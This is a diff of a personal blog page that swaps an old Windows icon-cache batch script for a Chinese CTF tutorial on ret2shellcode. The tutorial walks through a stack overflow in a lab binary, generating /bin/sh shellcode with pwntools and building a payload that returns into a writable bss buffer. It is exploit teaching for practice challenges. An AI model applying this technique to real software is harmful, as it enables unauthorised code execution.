@@ -96,15 +96,15 @@
 
 
 
-<meta name="description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  批处理内容（管理员身份运行）：">
+<meta name="description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  上一次我们使用栈溢出对ret2text进行溢出，但是该程序自己有一个shellcode，一般情况都是没有的，这次我们就来解决一个没有自带shellcode的程序">
 <meta property="og:type" content="article">
-<meta property="og:title" content="win11下任务栏软件白色">
-<meta property="og:url" content="http://www.shicoder.top/posts/3813897216.html">
+<meta property="og:title" content="ret2shellcode">
+<meta property="og:url" content="http://www.shicoder.top/posts/568031892.html">
 <meta property="og:site_name" content="一个爱代码的Coder">
-<meta property="og:description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  批处理内容（管理员身份运行）：">
+<meta property="og:description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  上一次我们使用栈溢出对ret2text进行溢出，但是该程序自己有一个shellcode，一般情况都是没有的，这次我们就来解决一个没有自带shellcode的程序">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-04-29T01:57:42.000Z">
-<meta property="article:modified_time" content="2022-04-29T11:45:14.000Z">
+<meta property="article:published_time" content="2022-05-04T03:31:11.000Z">
+<meta property="article:modified_time" content="2022-05-04T11:10:16.161Z">
 <meta property="article:author" content="shilinkun">
 <meta property="article:tag" content="导航">
 <meta property="article:tag" content="分享">
@@ -138,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="http://www.shicoder.top/posts/3813897216.html"/>
+  <link rel="canonical" href="http://www.shicoder.top/posts/568031892.html"/>
 
 
 
 
 
-  <title>win11下任务栏软件白色 | 一个爱代码的Coder</title>
+  <title>ret2shellcode | 一个爱代码的Coder</title>
   
 
 
@@ -324,7 +324,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.shicoder.top/posts/3813897216.html">
+    <link itemprop="mainEntityOfPage" href="http://www.shicoder.top/posts/568031892.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -341,7 +341,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">win11下任务栏软件白色</h1>
+          <h1 class="post-title" itemprop="name headline">ret2shellcode</h1>
         
 
         <div class="post-meta">
@@ -354,8 +354,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-04-29T09:57:42+08:00">
-                2022-04-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-05-04T11:31:11+08:00">
+                2022-05-04
               </time>
             
 
@@ -377,8 +377,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index">
-                    <span itemprop="name">其他</span>
+                  <a href="/categories/PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">PWN</span>
                   </a>
                 </span>
 
@@ -395,8 +395,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/posts/3813897216.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/posts/3813897216.html" itemprop="commentCount"></span>
+                <a href="/posts/568031892.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/posts/568031892.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -423,7 +423,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  186
+                  1.2k
                 </span>
               
 
@@ -439,7 +439,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  5
                 </span>
               
             </div>
@@ -463,11 +463,57 @@
         <blockquote>
 <p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p>
 </blockquote>
-<p>批处理内容（管理员身份运行）：</p>
+<p>上一次我们使用栈溢出对ret2text进行溢出，但是该程序自己有一个shellcode，一般情况都是没有的，这次我们就来解决一个没有自带shellcode的程序</p>
 <span id="more"></span>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /im explorer.exe </span><br><span class="line">attrib -h -s -r &quot;%userprofile%\AppData\Local\IconCache.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\IconCache.db&quot; </span><br><span class="line">attrib /s /d -h -s -r &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\*&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_32.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_96.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_102.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_256.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1024.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_idx.db&quot; </span><br><span class="line">del /f &quot;%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_sr.db&quot;  </span><br><span class="line">echo y|reg delete &quot;HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify&quot; /v IconStreams </span><br><span class="line">echo y|reg delete &quot;HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify&quot; /v PastIconsStream </span><br><span class="line">start explorer </span><br></pre></td></tr></table></figure>
+<p>同样，我们先来运行下这个程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">./ret2shellcode</span> </span><br><span class="line">No system for you this time !!!</span><br></pre></td></tr></table></figure>
 
+<p>可以看到这次已经提醒你没有预先写好的shell函数供你使用，因此我们的想法是自己写一段shell，然后在返回地址覆盖为shell的地址，那么写到哪里呢，有2个地方：</p>
+<ul>
+<li>栈</li>
+<li>bss</li>
+</ul>
+<p>我们可以首先看下开启了哪些保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">checksec ret2shellcode</span></span><br><span class="line">[*] &#x27;/home/pwn/桌面/题目/ROP/ret2shellcode&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>有一个可读可写可执行，我们去看下各个段的权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/pwn/桌面/题目/ROP/ret2shellcode</span><br><span class="line">0xf7dcb000 0xf7fb3000 r-xp   1e8000 0      /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 r-xp     2000 1e7000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb5000 0xf7fb7000 rwxp     2000 1e9000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb7000 0xf7fb9000 rwxp     2000 0      </span><br><span class="line">0xf7fcb000 0xf7fcd000 rwxp     2000 0      </span><br><span class="line">0xf7fcd000 0xf7fd0000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd0000 0xf7fd1000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd1000 0xf7ffb000 r-xp    2a000 0      /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 2a000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 2b000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure>
+
+<p>发现栈是可读可写可执行，那是不是就可以直接将程序写在栈上面，然后将返回地址覆盖为该程序地址呢？其实不可以，首先是否可以在栈上执行程序，有3个防护措施都有关</p>
+<ul>
+<li>canny</li>
+</ul>
+<p>每次在进入新函数的时候，之前是直接填充新函数的栈帧，但是这个措施可以在填充之前先加一个canny（一个特定的数值），当调用函数返回时候，先检查该值是否为填充的值，若不一样，则直接程序退出，由于我们覆盖栈，肯定是要覆盖栈帧，所以覆盖完之后，就会发现canny没有了，就会失败</p>
+<ul>
+<li>nx</li>
+</ul>
+<p>栈是否可以执行</p>
+<ul>
+<li>ASLR</li>
+</ul>
+<p>随机化程序的堆、栈、共享内存的地址，这样随机化之后，我们就不能在栈上写程序，因为每次地址都会变化</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">0：关闭</span><br><span class="line">1：随机化栈基地址（stack）、共享库（.so\libraries）、mmap 基地址</span><br><span class="line">2：在1基础上，增加随机化堆基地址（chunk）</span><br></pre></td></tr></table></figure>
+
+<p>在做题的时候，基本上这个都是打开的，所以一般不要想在栈上执行程序</p>
+<p>那基于此，我们只能在bss上执行程序，我们在<code>IDA</code>可以看到</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有一个strncpy函数，拷贝到buf2中，我们可以看到buf2是一个全局变量，因此在bss中，那刚好，就把s中的内容移到bss中，然后覆盖地址为bss的起始地址，bss中起始内容就是shellcode，那么开始把</p>
+<p>首先<code>pwn</code>包提供产生一段shellcode代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode</span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80</span></span><br></pre></td></tr></table></figure>
+
+<p>然后我们用<code>GDB</code>看下填充多少字节</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">stack 40</span></span><br><span class="line">00:0000│ esp  0xffffd0f0 —▸ 0xffffd10c ◂— &#x27;AAAAAAAA&#x27;</span><br><span class="line">01:0004│      0xffffd0f4 ◂— 0x0</span><br><span class="line">02:0008│      0xffffd0f8 ◂— 0x1</span><br><span class="line">03:000c│      0xffffd0fc ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffd108 —▸ 0xf7ffd000 ◂— and    al, 0xbf /* 0x2bf24 */</span><br><span class="line">07:001c│ eax  0xffffd10c ◂— &#x27;AAAAAAAA&#x27;</span><br><span class="line">... ↓</span><br><span class="line">09:0024│ edx  0xffffd114 ◂— 0x500</span><br><span class="line">0a:0028│      0xffffd118 ◂— 0xa5</span><br><span class="line">0b:002c│      0xffffd11c —▸ 0xf7fb3a80 (__dso_handle) ◂— cmp    byte ptr [edx], 0xfb</span><br><span class="line">0c:0030│      0xffffd120 ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd124 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */</span><br><span class="line">0e:0038│      0xffffd128 —▸ 0xf7ffc7e0 (_rtld_global_ro) ◂— add    byte ptr [eax], al</span><br><span class="line">0f:003c│      0xffffd12c —▸ 0xf7fb8c68 (__exit_funcs_lock) ◂— 0</span><br><span class="line">10:0040│      0xffffd130 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */</span><br><span class="line">11:0044│      0xffffd134 —▸ 0xf7fe22f0 ◂— endbr32 </span><br><span class="line">12:0048│      0xffffd138 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd13c —▸ 0x804838d (_init+9) ◂— add    ebx, 0x1c73</span><br><span class="line">14:0050│      0xffffd140 —▸ 0xf7fb53fc (__exit_funcs) —▸ 0xf7fb6900 (initial) ◂— 0</span><br><span class="line">15:0054│      0xffffd144 ◂— 0x40000</span><br><span class="line">16:0058│      0xffffd148 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— add    dword ptr [eax], eax</span><br><span class="line">17:005c│      0xffffd14c —▸ 0x8048622 (__libc_csu_init+82) ◂— add    edi, 1</span><br><span class="line">18:0060│      0xffffd150 ◂— 0x1</span><br><span class="line">19:0064│      0xffffd154 —▸ 0xffffd214 —▸ 0xffffd3c0 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">1a:0068│      0xffffd158 —▸ 0xffffd21c —▸ 0xffffd3ea ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">1b:006c│      0xffffd15c —▸ 0xf7e03519 (__cxa_atexit+41) ◂— add    esp, 0x1c</span><br><span class="line">1c:0070│      0xffffd160 —▸ 0xf7fe22f0 ◂— endbr32 </span><br><span class="line">1d:0074│      0xffffd164 ◂— 0x0</span><br><span class="line">1e:0078│      0xffffd168 —▸ 0x80485db (__libc_csu_init+11) ◂— add    ebx, 0x1a25</span><br><span class="line">1f:007c│      0xffffd16c ◂— 0x0</span><br><span class="line">20:0080│      0xffffd170 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e9d6c */</span><br><span class="line">... ↓</span><br><span class="line">22:0088│ ebp  0xffffd178 ◂— 0x0</span><br><span class="line">23:008c│      0xffffd17c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line">24:0090│      0xffffd180 ◂— 0x1</span><br><span class="line">25:0094│      0xffffd184 —▸ 0xffffd214 —▸ 0xffffd3c0 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">26:0098│      0xffffd188 —▸ 0xffffd21c —▸ 0xffffd3ea ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">27:009c│      0xffffd18c —▸ 0xffffd1a4 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+<p>从<code>0xffffd10c</code>到<code>0xffffd17c</code>填充112字节垃圾数据，从<code>0xffffd17c</code>填充4字节的地址</p>
+<p>因此<code>payload</code>为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf = <span class="number">0x0804A080</span> <span class="comment"># bss段的地址</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(buf)</span><br></pre></td></tr></table></figure>
+
+<p>其中的buf通过<code>IDA</code>看到</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br></pre></td></tr></table></figure>
+
+<p>最后便可以成功拿到shell啦，感谢大家的阅读</p>
 
       
     </div>
@@ -517,7 +563,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://www.shicoder.top/posts/3813897216.html" title="win11下任务栏软件白色">http://www.shicoder.top/posts/3813897216.html</a>
+    <a href="http://www.shicoder.top/posts/568031892.html" title="ret2shellcode">http://www.shicoder.top/posts/568031892.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -559,8 +605,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/1579451164.html" rel="next" title="mongodb初探">
-                <i class="fa fa-chevron-left"></i> mongodb初探
+              <a href="/posts/2378835965.html" rel="next" title="mongodb高级操作">
+                <i class="fa fa-chevron-left"></i> mongodb高级操作
               </a>
             
           </div>
@@ -568,10 +614,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/posts/3330740389.html" rel="prev" title="函数调用栈">
-                函数调用栈 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
